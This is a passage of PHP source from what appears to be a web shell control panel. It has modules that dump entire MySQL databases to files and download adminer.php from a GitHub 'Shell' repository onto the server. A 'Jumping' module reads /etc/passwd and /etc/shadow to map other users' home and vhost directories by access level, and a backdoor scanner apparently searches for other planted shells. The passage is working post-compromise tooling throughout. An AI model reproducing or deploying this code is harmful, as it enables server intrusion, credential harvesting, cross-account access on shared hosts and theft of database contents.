                            'detail' => "ERR: Failed to get columns for $tableName: " . $mysqli->error,
                            'scheme' => $scheme
                        ];
                    }
                    $row_count = $mysqli->query("SELECT COUNT(*) AS count FROM $tableName")->fetch_assoc()['count'];
                    $scheme_output .= "┌" . styles_($tableName, "primary", '(,)', 'white') . " → " . styles_($row_count, 'themecolor-green', '(,)', 'white') . "\n";

                    $num_columns = $columns->num_rows;
                    $column_counter = 0;
                    while ($column = $columns->fetch_assoc()) {
                        $column_counter++;
                        $prefix = $column_counter == $num_columns ? "└⇾" : "├⇾";

                        $scheme_output .= "$prefix " . styles_($column['Field'], "themecolor-orange", '(,)', 'white') . " → " . styles_($column['Type'], 'themecolor-300') . "\n";
                    }
                    $scheme_output .= "\n";
                }

                if ($option == 'db_scheme_table' && in_array($tableName, $db_table_names_array)) {
                    $columns = $mysqli->query("SHOW COLUMNS FROM $tableName");
                    if (!$columns) {
                        return [
                            'status' => 'failed',
                            'detail' => "ERR: Failed to get columns for $tableName: " . $mysqli->error,
                            'scheme' => $scheme
                        ];
                    }
                    $row_count = $mysqli->query("SELECT COUNT(*) AS count FROM $tableName")->fetch_assoc()['count'];
                    $scheme_output .= "┌" . styles_($tableName, "primary", '(,)', 'white') . " → " . styles_($row_count, 'themecolor-green', '(,)', 'white') . "\n";

                    $num_columns = $columns->num_rows;
                    $column_counter = 0;
                    while ($column = $columns->fetch_assoc()) {
                        $column_counter++;
                        $prefix = $column_counter == $num_columns ? "└┬⇾" : "├┬⇾";

                        $scheme_output .= "$prefix " . styles_($column['Field'], "themecolor-orange", '(,)', 'white') . " → " . styles_($column['Type'], 'themecolor-300') . "\n";
                        $rows = $mysqli->query("SELECT {$column['Field']} FROM $tableName");
                        $num_rows = $rows->num_rows;
                        $row_counter = 0;
                        while ($row = $rows->fetch_assoc()) {
                            $row_counter++;
                            if ($column_counter == $num_columns) {
                                $row_prefix = $row_counter == $num_rows ? styles_('─', 'transparent') . '└⇾' : styles_('─', 'transparent') . '├⇾';
                            } else {
                                $row_prefix = $row_counter == $num_rows ? '│└⇾' : '│├⇾';
                            }
                            $scheme_output .= "$row_prefix " . styles_($row[$column['Field']], 'themecolor-teal') . "\n";
                        }
                    }
                    $scheme_output .= "\n";
                }

                if ($option == 'all') {
                    $rows = $mysqli->query("SELECT * FROM $tableName");
                    if ($rows->num_rows > 0) {
                        while ($row = $rows->fetch_row()) {
                            foreach ($row as $key => $value) {
                                $row[$key] = "'" . $mysqli->real_escape_string($value) . "'";
                            }
                            $all_output .= "INSERT INTO $tableName VALUES(" . implode(",", $row) . ");\n";
                        }
                    }
                }

                if (!empty($db_table_name) && $option == 'table' && in_array($tableName, $db_table_names_array)) {
                    $column_output .= "$createStatement;\n";
                    $rows = $mysqli->query("SELECT * FROM $tableName");
                    if ($rows->num_rows > 0) {
                        while ($row = $rows->fetch_row()) {
                            foreach ($row as $key => $value) {
                                $row[$key] = "'" . $mysqli->real_escape_string($value) . "'";
                            }
                            $column_output .= "INSERT INTO $tableName VALUES(" . implode(",", $row) . ");\n";
                        }
                    }
                }
            }

            $mysqli->close();

            if ($option == 'all') {
                if (Filesman::__save_file($sqldestination, $all_output)) {
                    $status = 'success';
                    $detail = "Database saved into > $sqldestination";
                } else {
                    $status = 'failed';
                    $detail = "ERR: Failed Save output into > $sqldestination";
                }
            } else if ($option == 'table') {
                if (Filesman::__save_file($sqldestination, $column_output)) {
                    $status = 'success';
                    $detail = "Database saved into > $sqldestination";
                } else {
                    $status = 'failed';
                    $detail = "ERR: Failed Save output into > $sqldestination > $column_output";
                }
            } else if ($option == 'db_scheme' || $option == 'db_scheme_table' || $option == 'scheme') {
                if ($option == 'scheme') {
                    $schemeval = preg_replace('/<[^>]*>/', '', $schemeval);
                    if (Filesman::__save_file($sqldestination, $schemeval)) {
                        $status = 'success';
                        $detail = "Scheme saved into > $sqldestination";
                    } else {
                        $status = 'failed';
                        $detail = "ERR: Failed Save scheme into > $sqldestination > $column_output";
                    }
                } else {
                    $status = 'success';
                    $detail = "Database Scheme Dumped!";
                    $scheme = $scheme_output;
                }
            }
        }

        return [
            'status' => $status,
            'detail' => $detail,
            'scheme' => $scheme
        ];
    }
}


class Adminer
{
    public static function __adminer_html($dir){
        $data_config = array(
            'data' => "adminer",
            'dir' => $dir,
            'hiddenVal' => null,
            'titleHref' => null,
            'action' => [['href', 'link', 'login'], ['button', 'delete', 'delete']],
            'jsonKey' => ['f', 'p'],
            'statusKey' => ['path' => 'p', 'file' => 'f'],
            'rowStyle' => ['p' => ['font-normal', 'text-foreground']],
            'tableHeader' => null,
            'return' => 'table'
        );
        return
'<div class="md:flex gap-2 text-left">
    <div class="w-full">
        <label for="adminername" class="block mb-2 text-sm font-medium text-foreground">Adminer Filename</label>
        <input type="text" id="adminername" value="'. uniqid() . '.php' .'" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Filename">
    </div>
    <div class="w-full mt-4 md:mt-0">
        <label for="adminerdst" class="block mb-2 text-sm font-medium text-foreground">Adminer Destination</label>
        <div class="flex gap-2">
            <input type="text" id="adminerdst" value="'. $dir .'" class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary" placeholder="Adminer Destination | path/to/file/adminer.php">
            <a onclick="S(`'. Utils::__charcode_enc('{"0": "adminername", "1": "adminerdst"}') .'`)" class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>

        </div>
    </div>
</div>

<div class="relative overflow-auto pt-4 text-left w-full">
    <details class="group [&_summary::-webkit-details-marker]:hidden my-4" open>
        <summary class="text-foreground flex cursor-pointer items-center justify-start mb-2 gap-1.5 rounded-lg" >
        <h2 class="font-medium text-sm grid lg:flex">Adminer history data</h2>
        <svg
            class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5 5 1 1 5"></path>
        </svg>
        </summary>
        <div class="h-auto flex-1 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
            '. Utils::__get_data($data_config) .'
        </div>
    </details>
</div>

<script>
$(`#tools_container`).addClass(`overflow-auto`);
</script>'
        ;
    }

    public static function __adminer_function($name, $path)
    {
        $ADMINER_URL = 'https://raw.githubusercontent.com/SANSDESU/Shell/main/adminer.php';

        $data_config = array(
            'data' => "adminer",
            'dir' => $path,
            'hiddenVal' => null,
            'titleHref' => null,
            'action' => [['href', 'link', 'login'], ['button', 'delete', 'delete']],
            'jsonKey' => ['f', 'p'],
            'statusKey' => ['path' => 'p', 'file' => 'f'],
            'rowStyle' => ['p' => ['font-normal', 'text-foreground']],
            'tableHeader' => null,
            'return' => ''
        );

        $outputFile = rtrim($path . __DIRECTORY_SEPARATOR__) . __DIRECTORY_SEPARATOR__ . $name;

        if (Filesman::__save_file($outputFile, Filesman::__read_file($ADMINER_URL))) {
            $data_config['return'] = 'array';
            $saveData = Utils::__get_data($data_config);
            array_push($saveData, ['f' => basename($outputFile), 'p' => dirname($outputFile)]);
            Utils::__save_data('adminer', $saveData);

            $data_config['return'] = 'tbody';
            $updateList = Utils::__charcode_enc(Utils::__get_data($data_config));
            $response = ['status' => 'success', 'detail' => 'Create adminer success.', 'redirect' => false, 'temp' => '$(`#table-body-adminer`).html(charcodeDec(`' . $updateList . '`));'];
        } else {
            $response = ['status' => 'failed', 'detail' => 'Failed to create adminer.'];
        }

        return json_encode($response);
    }
}


class Jumping
{
    public static function __jumping_html($dir)
    {
        $PSW = "/etc/passwd";
        $SHD = "/etc/shadow";
        $JUMP = '';
        $ETCPASSWDLIST = [
            'count' => 0,
            'usr' => []
        ];
        $ETCSHADOWLIST = [
            'count' => 0,
            'usr' => []
        ];
        $BASEDIRLIST = [
            'count' => 0,
            'dir' => []
        ];
        $JUMPLIST = [];

        $passwdPerm = Filesman::__get_permission($PSW, ' ', 'themecolor-400', false);
        $shadowPerm = Filesman::__get_permission($SHD, ' ', 'themecolor-400', false);

        if (is_readable($PSW)) {
            $passwd = Filesman::__read_file($PSW);
            preg_match_all('/(.*?):x:/', $passwd, $passwd_jumping);
            foreach ($passwd_jumping[1] as $user_passwd_jump) {
                $ETCPASSWDLIST['count']++;
                $ETCPASSWDLIST['usr'][] = $user_passwd_jump;
            }
            $passwdUsr = "<span class='text-themecolor-sky'> {$ETCPASSWDLIST['count']} Entries</span>";
        } else {
            $passwdUsr = "<span class='text-themecolor-red'>Can't read $PSW</span>";
        }

        if (is_readable($SHD)) {
            $shadow = Filesman::__read_file($SHD);
            preg_match_all('/(.*?):x:/', $shadow, $shadow_jumping);
            foreach ($shadow_jumping[1] as $user_shadow_jump) {
                $ETCSHADOWLIST['count']++;
                $ETCSHADOWLIST['usr'][] = $user_shadow_jump;
            }
            $shadowUsr = "<span class='text-themecolor-sky'> {$ETCSHADOWLIST['count']} Entries</span>";
        } else {
            $shadowUsr = "<span class='text-themecolor-red'>Can't read $SHD</span>";
        }

        foreach ($GLOBALS['ER0_array']['basedir_path'] as $baseDir) {
            $paths = Utils::__create_path($baseDir);
            if (file_exists(Utils::__create_path($paths)) && is_readable($paths)) {
                $BASEDIRLIST['count']++;
                $BASEDIRLIST['dir'][] = $baseDir;
            } else {
                if (preg_match('#^(.*?/' . $baseDir . '/)#', __SCRIPT_PATH__, $matches_)) {
                    $paths = $matches_[1] . $baseDir;
                    if (file_exists(Utils::__create_path($paths)) && is_readable($paths)) {
                        $BASEDIRLIST['count']++;
                        $BASEDIRLIST['dir'][] = $baseDir;
                    }
                } else if (preg_match('#^(.*?/www/)#', __SCRIPT_PATH__, $matches__)) {
                    $paths = $matches__[1] . $baseDir;
                    if (file_exists(Utils::__create_path($paths)) && is_readable($paths)) {
                        $BASEDIRLIST['count']++;
                        $BASEDIRLIST['dir'][] = $baseDir;
                    }
                }
            }
        }

        if (!empty($BASEDIRLIST['dir'])) {
            $baseDr = "<span class='text-themecolor-sky'>{$BASEDIRLIST['count']} Entries</span>";
            $baseDrr = '';
            foreach ($BASEDIRLIST['dir'] as $d) {
                $baseDrr .= $d . ', ';
            }
            $baseDrr = "<span class='text-themecolor-green'>" . rtrim(trim($baseDrr), ',') . "</span>";
        } else {
            $baseDr = "<span class='text-themecolor-red'>BaseDir not found</span>";
            $baseDrr = "<span class='text-themecolor-400'>EMPTY</span>";
        }

        foreach ($BASEDIRLIST['dir'] as $jumpDir) {
            if ($jumpDir == 'hsphere') {
                if (!empty($ETCPASSWDLIST['usr'])) {
                    foreach ($ETCPASSWDLIST['usr'] as $usr) {
                        $hspath = "/hsphere/local/home/" . $usr . '/';
                        if (is_dir($hspath)) {
                            if (is_readable($hspath)) {
                                $hsbasebase = '';

                                foreach (scandir($hspath) as $hsbspath) {
                                    if ($hsbspath == '.' || $hsbspath == '..') continue;
                                    foreach ($GLOBALS['ER0_array']['public_folder'] as $publ) {
                                        if ($hsbspath == $publ) {
                                            $status = (is_readable($hspath . $hsbspath) ? (is_writable($hspath . $hsbspath) ? 'rw' : 'r') : 'err');
                                            $hsbasebase .= "<a href='#action={$GLOBALS['ER0_string']['filesman']}&dir=" . Utils::__string_enc($hspath . $publ) . "' class='text-themecolor-" . (str_contains($status, 'r') ? ($status == 'rw' ? 'green' : 'orange') : 'red') . " hover:brightness-75'>$publ</a>" . " | ";
                                        }
                                    }
                                }

                                $hsbasebase = ' [ ' . trim(rtrim(trim($hsbasebase), '|')) . ' ]';

                                $JUMPLIST[] = [
                                    'base' => $hspath . $hsbasebase,
                                    'home' => "<span class='text-themecolor-sky'>" . $usr . "</span>"
                                ];
                            } else {
                                if (file_exists($hspath)) {
                                    $JUMPLIST[] = [
                                        'base' => '<span class="flex">' . $hspath . ' [' . Filesman::__get_permission($hspath, ' ', 'themecolor-400', false) . ']</span>',
                                        'home' => "<span class='text-themecolor-red'>" . $usr . "</span>"
                                    ];
                                }
                            }
                        }
                    }
                }
            } else if ($jumpDir == 'vhosts') {
                //use searcher if tools created
                if (preg_match('#^(.*?/www/)#', __SCRIPT_PATH__, $matches)) {

                    $vhpath = rtrim(rtrim($matches[1], '\\'), '/') . '/vhosts/';

                    if (is_dir($vhpath)) {
                        if (is_readable($vhpath)) {
                            foreach (scandir($vhpath) as $vhbspath) {
                                if ($vhbspath == '.' || $vhbspath == '..') continue;
                                $vhpathf = $vhpath . $vhbspath . '/';

                                if (is_readable($vhpathf)) {
                                    $vhbasebase = '';

                                    foreach (scandir($vhpathf) as $vhsitepath) {
                                        if ($vhsitepath == '.' || $vhsitepath == '..') continue;
                                        foreach ($GLOBALS['ER0_array']['public_folder'] as $publ) {
                                            if ($vhsitepath == $publ) {
                                                $status = (is_readable($vhpathf . $vhsitepath) ? (is_writable($vhpathf . $vhsitepath) ? 'rw' : 'r') : 'err');
                                                $vhbasebase .= "<a href='#action={$GLOBALS['ER0_string']['filesman']}&dir=" . Utils::__string_enc($vhpathf . $publ) . "' class='text-themecolor-" . (str_contains($status, 'r') ? ($status == 'rw' ? 'green' : 'orange') : 'red') . " hover:brightness-75'>$publ</a>" . " | ";
                                            }
                                        }
                                    }

                                    $vhbasebase = ' [ ' . trim(rtrim(trim($vhbasebase), '|')) . ' ]';

                                    $JUMPLIST[] = [
                                        'base' => $vhpath . $vhbspath . '/' . $vhbasebase,
                                        'home' => "<span class='text-themecolor-sky'>" . $vhbspath . "</span>"
                                    ];
                                } else {

                                    $JUMPLIST[] = [
                                        'base' => '<span class="flex">' . $vhpath . $vhbspath . ' [' . Filesman::__get_permission($vhpathf, ' ', 'themecolor-400', false) . ']</span>',
                                        'home' => "<span class='text-themecolor-red'>$vhbspath</span>"
                                    ];
                                }
                            }
                        } else {
                            $JUMPLIST[] = [
                                'base' => '<span class="flex">' . $vhpath . ' [' . Filesman::__get_permission($vhpath, ' ', 'themecolor-400', false) . ']</span>',
                                'home' => "<span class='text-themecolor-red'>vhosts</span>"
                            ];
                        }
                    }
                }
            } else {
                if (!empty($ETCPASSWDLIST['usr'])) {
                    foreach ($ETCPASSWDLIST['usr'] as $usr) {
                        $usrhome = "/home/" . $usr . '/';
                        if (is_readable($usrhome)) {
                            $userbase = '';

                            foreach (scandir($usrhome) as $usrbspath) {
                                if ($usrbspath == '.' || $usrbspath == '..') continue;
                                foreach ($GLOBALS['ER0_array']['public_folder'] as $publ) {
                                    if ($usrbspath == $publ) {
                                        $status = (is_readable($usrhome . $usrbspath) ? (is_writable($usrhome . $usrbspath) ? 'rw' : 'r') : 'err');
                                        $userbase .= "<a href='#action={$GLOBALS['ER0_string']['filesman']}&dir=" . Utils::__string_enc($usrhome . $publ) . "' class='text-themecolor-" . (str_contains($status, 'r') ? ($status == 'rw' ? 'green' : 'orange') : 'red') . " hover:brightness-75'>$publ</a>" . " | ";
                                    }
                                }
                            }

                            $userbase = ' [ ' . trim(rtrim(trim($userbase), '|')) . ' ]';

                            $JUMPLIST[] = [
                                'base' => $usrhome . $userbase,
                                'home' => "<span class='text-themecolor-sky'>" . $usr . "</span>"
                            ];
                        } else {
                            if (file_exists($usrhome)) {

                                $JUMPLIST[] = [
                                    'base' => '<span class="flex">' . $usrhome . ' [' . Filesman::__get_permission($usrhome, ' ', 'themecolor-400', false) . ']</span>',
                                    'home' => "<span class='text-themecolor-red'>" . $usr . "</span>"
                                ];
                            }
                        }
                    }
                }
            }
        }

        foreach ($JUMPLIST as $res) {
            $JUMP .= '<tr class="border-b border-themecolor-800">
            <td scope="row" class="px-6 py-4 whitespace-nowrap font-normal">
                <div class="flex text-left gap-2">
                    <span class="w-full">' . $res['base'] . '</span>
                </div>
            </td>
            <td scope="row" class="px-6 py-4 whitespace-nowrap font-bold text-foreground">
                <div class="flex text-center items-center gap-2">
                    <span class="w-full hover:brightness-75">' . $res['home'] . '</span>
                </div>
            </td>
        </tr>';
        }

        return
'<div
    class="h-auto text-left mb-4 overflow-auto block p-2 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 text-themecolor-400">
    <span class="text-themecolor-300">Useful Files:</span>
    <span class="text-themecolor-300 flex gap-1 mt-1">> [ <span class="text-themecolor-orange">/etc/passwd</span> | '.
        $passwdPerm .' | '. $passwdUsr .' ]</span>
    <span class="text-themecolor-300 flex gap-1 mt-1 mb-2">> [ <span class="text-themecolor-orange">/etc/shadow</span> | '.
        $shadowPerm .' | '. $shadowUsr .' ]</span>

    <span class="text-themecolor-300 flex gap-1">Found BaseDir : '. $baseDr .'</span>
    <span class="text-themecolor-300 flex gap-1 mt-1 mb-2">> [ '. $baseDrr .' ]</span>

    <span class="text-themecolor-300 flex gap-1">Status:</span>
    <span class="text-themecolor-300 flex gap-1 mt-1">> [ <span class="text-themecolor-green">green = Read & Write</span>
        ]</span>
    <span class="text-themecolor-300 flex gap-1 mt-1">> [ <span class="text-themecolor-orange">orange = Read Only</span>
        ]</span>
    <span class="text-themecolor-300 flex gap-1 mt-1 mb-2">> [ <span class="text-themecolor-red">red = Not Accessible</span>
        ]</span>
</div>

<div class="h-auto flex-1 overflow-auto max-h-[50vh] rounded-lg border bg-themecolor-700 border-themecolor-600">

    <table class="table-auto text-sm w-full text-themecolor-400">
        <thead class="text-xs uppercase bg-themecolor-700 text-themecolor-400 rounded-t-lg">
            <tr class="border-b bg-themecolor-900 p-2 border-themecolor-600">
                <th scope="col" class="px-6 py-3">BaseDir</th>
                <th scope="col" class="px-6 py-3">Home</th>
            </tr>
        </thead>
        <tbody>
            '. $JUMP .'
        </tbody>
    </table>
</div>
<script>
    $(`#tools_container`).addClass(`overflow-auto`);
</script>';
    }
}


class BackdoorScanner
{
    public static function __backdoorscanner_html($dir)
    {

        $data_config = array(
            'data' => "backdoor",
            'dir' => $dir,
            'hiddenVal' => null,
            'titleHref' => null,
            'action' => [['href', 'open', 'open'], ['button', 'delete', 'remove data']],
            'jsonKey' => ['f', ['p', ['input', 'disabled']], ['s', ['input', 'disabled']]],
            'statusKey' => ['path' => 'p', 'file' => 'f'],
            'showStatus' => true,
            'rowStyle' => ['f' => ['font-bold', 'text-foreground'], 'p' => ['font-normal', 'text-gray-500'], 's' => ['font-normal', 'text-themecolor-orange']],
            'tableHeader' => ['Filename', 'Path', 'Suspicious'],
            'return' => 'table'
        );

        return
            '<!-- To use php code, wrap the php code with this tag

-->

<!-- Example Input wrapper for tools -->
<div class="sm:flex gap-2 text-left">
    <div class="w-full">
        <label for="dirpath" class="block mb-2 text-sm font-medium text-foreground">Directory Path</label>
        <input type="text" id="dirpath" value="'.$dir.'"
            class="border text-sm rounded-lg block w-full p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary"
            placeholder="Path/to/folder...">
    </div>

    <div class="flex gap-2 mt-2 sm:mt-0">
        <div class="w-full sm:w-auto">
            <label for="scantype" class="block mb-2 text-sm font-medium text-foreground">Scan Type</label>
            <select id="scantype" onchange="BSPayload(this)"
                class="p-2.5 bg-themecolor-700 sm:w-auto w-full border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
                <option value="all" selected class="text-left">Use All</option>
                <option value="name" class="text-left">File Name</option>
                <option value="content" class="text-left">File Content</option>
            </select>
        </div>
        <div class="w-full sm:w-auto">
            <label for="extension" class="block mb-2 text-sm font-medium text-foreground">Extension</label>
            <select id="extension"
                    class="p-2.5 bg-themecolor-700 sm:w-auto w-full border border-themecolor-600 placeholder-themecolor-400 text-foreground text-sm rounded focus:ring-primary focus:border-primary block">
                    <option value="all" selected class="text-left">All File</option>
                    <option value="php" class="text-left">PHP</option>
                    <option value="asp" class="text-left">ASP</option>
            </select>
        </div>
        <div class="w-full sm:w-auto">
            <label for="delay" class="block mb-2 text-sm font-medium text-foreground">Delay</label>
            <div class="flex gap-2">
                <input type="number" min="1" id="delay" value="1"
                class="border text-sm rounded-lg block w-14 p-2.5 bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 text-foreground focus:ring-primary focus:border-primary">
                <a onclick="BackdoorScanner()"
                    class="text-sm cursor-pointer font-medium inline-flex items-center rounded w-auto text-foreground bg-themecolor-700 hover:bg-primary p-2.5 border border-themecolor-600">>></a>
            </div>
        </div>
    </div>
</div>

<div class="mt-4 text-left">
    <div class="h-full flex-1">
        <label id="payload-title" for="payload"
            class="block mb-2 text-sm font-medium text-foreground grid md:flex gap-1"><span class="flex">Scan List: <span
                    class="ml-1 text-themecolor-orange">File Name, File Content</span></span></label>
        <textarea autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" id="payload" rows="2" disabled readonly
            class="block p-2.5 w-full text-sm rounded-lg border bg-themecolor-700 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary"
            placeholder="Scan list, separate by comma (,) e.g s3x, 404, 403, alfa, etc..">Scan All {filename => filecontent}</textarea>
    </div>
</div>

<div class="relative overflow-auto pt-4 text-left w-full">
    <details class="group [&amp;_summary::-webkit-details-marker]:hidden my-4" open="">
        <summary class="text-foreground flex cursor-pointer items-center justify-start mb-2 gap-1.5 rounded-lg">
            <h2 class="font-medium text-sm grid lg:flex">Running Tasks <span class="ml-2 text-themecolor-400">- Note: Refreshing the page or stopping the task will cancel the scan and discard progress.</span></h2>
            <svg class="w-3 h-3 shrink-0 transition duration-300 group-open:-rotate-180"
                xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6" stroke="currentColor">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M9 5 5 1 1 5"></path>
            </svg>
        </summary>
        <div class="h-auto flex-1 overflow-auto max-h-[75vh] rounded-lg border bg-themecolor-700 border-themecolor-600">

            <table id="table-backdoor-task" class="table-auto text-sm w-full text-themecolor-400">
                <thead id="table-head-backdoor-task"
                    class="text-xs uppercase bg-themecolor-700 text-themecolor-400 rounded-t-lg">
                    <tr class="border-b bg-themecolor-900 p-2 border-themecolor-600">
                        <th scope="col" class="px-6 py-3">Tasks</th>
                        <th scope="col" class="px-6 py-3">Status</th>
                        <th scope="col" class="px-6 py-3">Action</th>
                    </tr>
                </thead>
                <tbody id="table-body-backdoor-task">
                </tbody>
            </table>
        </div>
    </details>
</div>

<div class="mt-4 text-left">
    <input type="hidden" id="found-bd-hidden">
    <label class="block mb-2 text-sm font-medium text-foreground">Found Backdoor : <span id="found-bd" class="text-themecolor-orange">0</span></label>
    <div class="h-auto flex-1 overflow-auto max-h-[50vh] rounded-lg border bg-themecolor-700 border-themecolor-600">
        '. Utils::__get_data($data_config) .'
    </div>
</div>

<!-- Change tools container to overflow-auto -->
<!-- uncomment this script code if you wanna change the overflow into auto -->

<script>
    $(`#tools_container`).addClass(`overflow-auto`);
</script>';
    }

    public static function __backdoorscanner_js()
    {
        if (Session::__check_session()) {
            return
                'function BackdoorScanner() {
  const dirpath = $(`#dirpath`).val();
  const scantype = $(`#scantype`).val();
  const extension = $(`#extension`).val();
  const payload = $(`#payload`).val();
  const scan_name =
    "'. $GLOBALS['ER0_string']['scan_php_payload_byname'] .'";
  const scan_content =
    "'. $GLOBALS['ER0_string']['scan_php_payload_bycontent'] .'";

  if (
    dirpath == "" ||
    dirpath == " " ||
    dirpath == null ||
    payload == "" ||
    payload == " " ||
    payload == null
  ) {
    notify(
      "failed",
      charcodeEnc(`Please fill the path and payload field`),
      false
    );
    return false;
  }

  urls = `'.__DATA_DIR_URL__.'/tmp/'.basename($GLOBALS['ER0_string']['task_dir']).'/`;
  nmf = ``;
  for (i = 0; i < basename(dirpath).length; i++) nmf += basename(dirpath).charCodeAt(i);
  nmf = `.${nmf}_bdscan_proc.php`;

  nmRaw = nmf.replace(".php", "");
  nmRaw = nmRaw.replace(".", "");

  var execArray = new Object();
  execArray.onUpdate = btoa(
    `
    if(data.file == "done"){
      notify("success", charcodeEnc("Done scanning for task ${nmf.replace(".php","")}"), false, atob("PGkgY2xhc3M9ImJ4IGJ4LXNjYW4gYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="), "SCAN DONE");

      RequestWorker.stopTask(process, id, url, null, true);
      prcs = RequestWorker.listRunningTasks();
      task_manager("none" ,id , "remove");
      BSUpdateTask();

      $("#found-bd").text($("#found-bd-hidden").val() + data.count);

      if (prcs === undefined || prcs.length == 0) {
          var DATA = {
            "key": "BADKACRCONERSNO",
            "dir": getParams()["dir"],
          };

          const sendRequest = new AjaxRequest("POST", SCRIPT_PATH, DATA);
            sendRequest.send(
                function (datas) {
                    datas = JSON.parse(datas);
                    if(charcodeDec(datas.update) != "NOTUSE"){
                      eval(charcodeDec(datas.update));
                    }
                    elements = document.getElementsByClassName("cls-backdoor");
                    for (let i = 1; i <= elements.length; i++) {
                        $("#found-bd").text(i);
                    }
                },
                function (status, error) {
                    if(status != 0){
                        console.error("AJAX Error:", status, error);
                    }
                }
            );
      } else {
        $("#table-tr-backdoor-${nmRaw}").addClass("hidden");
      }

    } else {
      if(getParams()["tools"] == "backdoor_scanner" || getParams()["tools"] == "6261636b646f6f725f7363616e6e6572"){
        $("#table-tr-backdoor-${nmRaw}").html(\`
            <td scope="row" class="px-6 py-4 whitespace-nowrap font-bold text-foreground">
                <div class="flex items-center justify-start gap-2">
                    <span class="w-full hover:brightness-75"><span class="block max-w-[15rem] truncate" title="\`+data.file+\`"><span class="text-themecolor-orange mr-1">\`+data.count+\` > </span>\`+data.file+\`</span></span>
                </div>
            </td>

            <td scope="row" class="px-6 py-4 whitespace-nowrap font-normal text-gray-500">
                <div class="flex items-center justify-start gap-2">
                  <input disabled type="text" value="\`+data.path+\`" class="block pt-2 text-sm border rounded-lg w-auto max-w-[30rem] bg-themecolor-800 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary">
                </div>
            </td>

            <td scope="row" class="px-6 py-4 whitespace-nowrap font-normal text-themecolor-orange">
                <div class="flex items-center justify-start gap-2">
                  <input disabled type="text" value="\`+data.sus+\`" class="block pt-2 text-sm border rounded-lg w-auto max-w-[30rem] bg-themecolor-800 border-themecolor-600 placeholder-themecolor-400 focus:ring-primary focus:border-primary">
                </div>
            </td>

            <td scope="row" class="px-6 py-4 whitespace-nowrap font-normal text-themecolor-orange">
                <div class="flex items-center justify-start gap-2">
                    <span class="w-full hover:brightness-75"><span class="block max-w-[15rem] truncate" title="${nmRaw}">Scanning: ${nmRaw}</span></span>
                </div>
            </td>
        <td class="px-6 py-4"><div class="flex items-center gap-2">
            Please Wait ...
        </td>\`);
      }
    }
    `
  );
  execArray.onExists = btoa(
    `notify("failed", charcodeEnc("Task with ID ${nmRaw} exists!"), false, atob("PGkgY2xhc3M9ImJ4IGJ4LXNjYW4gYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="), "WARNING!", "yellow");`
  );
  execArray.onError = btoa(
    `notify("failed", charcodeEnc("Error occurred on task with ID ${nmRaw}!<br>Err: "+err), false, atob("PGkgY2xhc3M9ImJ4IGJ4LXNjYW4gYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="), "ERROR");
    task_manager("backdoor" ,"${nmf}" , "remove");
    $("#table-tr-backdoor-${nmRaw}").addClass("hidden");
    BSUpdateTask();`
  );
  execArray.onAbort = btoa(
    `notify("success", charcodeEnc("Task with ID ${nmRaw} stopped!"), false, atob("PGkgY2xhc3M9ImJ4IGJ4LXNjYW4gYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="), "STOPPED", "orange");
    task_manager("backdoor" ,"${nmf}" , "remove");
    $("#table-tr-backdoor-${nmRaw}").addClass("hidden");
    BSUpdateTask();`
  );
  var execEvent = JSON.stringify(execArray);

  runningTask = RequestWorker.listRunningTasks();
  if (runningTask === undefined || runningTask.length == 0) {
    $("#table-body-backdoor").html(``);
  }

  scan = `
  notify("success", charcodeEnc("Scan Started on ${nmRaw}, please wait..."), false, atob("PGkgY2xhc3M9ImJ4IGJ4LXNjYW4gYngtdGFkYSB0ZXh0LTV4bCI+PC9pPg=="), "SCANNING");
  const scanner = new RequestWorker("backdoor","${nmf}","${urls + nmf}?d=1","${btoa(
    execEvent
  )}");

  $("#table-body-backdoor").append(\`
  <tr id="table-tr-backdoor-${nmRaw}" class="border-b border-themecolor-600">
  </tr>\`);

  scanner.start();
  BSUpdateTask();
  `;

  var requiredData = new Object();
  requiredData.datafile = `'.__DIRECTORY_DATA__.'/'.$GLOBALS['ER0_data']['backdoor'].'`;
  requiredData.basedir = dirpath;
  requiredData.namelist = scantype == "name" ? payload : scan_name;
  requiredData.contentlist = scantype == "content" ? payload : scan_content;
  requiredData.scantype = scantype;
  requiredData.extension = extension;
  var requiredDataS = JSON.stringify(requiredData);

  task_manager("backdoor", nmf, "add", scan, requiredDataS);
}

getParams()["tools"] == "backdoor_scanner" ||
getParams()["tools"] == "6261636b646f6f725f7363616e6e6572"
  ? BSUpdateTask()
  : "";
$(window).on("hashchange", function () {
  getParams()["tools"] == "backdoor_scanner" ||
  getParams()["tools"] == "6261636b646f6f725f7363616e6e6572"
    ? BSUpdateTask()
    : "";
});

function BSUpdateTask() {
  $("#table-body-backdoor-task").html(``);

  prcs = RequestWorker.listRunningTasks();
  if (prcs === undefined || prcs.length == 0) {
    const elements = document.getElementsByClassName("cls-backdoor");
    for (let i = 1; i <= elements.length; i++) {
        $(`#found-bd`).text(i);
    }
  } else {
    prcs.forEach(function (task) {
      splitString = task.split("|");
      task_proccess = splitString[0];
      task_id = splitString[1];
      task_url = splitString[2];
      task_onclick =
        "RequestWorker.stopTask(`" +
